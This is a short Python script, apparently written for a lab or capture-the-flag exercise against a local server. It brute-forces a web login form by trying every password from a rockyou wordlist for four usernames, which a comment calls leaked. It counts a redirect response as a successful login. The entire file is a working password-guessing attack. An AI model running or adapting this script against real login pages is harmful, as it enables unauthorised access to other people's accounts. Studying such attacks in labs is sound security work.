import requests

HOST = "http://localhost:8888"

# Leak username
unames = ["john", "steve", "hana", "cow"]

# Read password dataset
with open("rockyou-30.txt", "r") as f:
  password_set = f.readlines()

ss = requests.Session()

for username in unames:
  print(f"Bruteforces password user: {username}")
  for pw in password_set:
    pw = pw.strip()
    print("Try:", pw)
    resp = ss.post(
        HOST + "/login", data={"username": username, "password": pw}, allow_redirects=False)
    if resp.status_code == 302:  # Redirect resp
      print("Found password:", pw)
      print("-" * 100)
      print()
      break
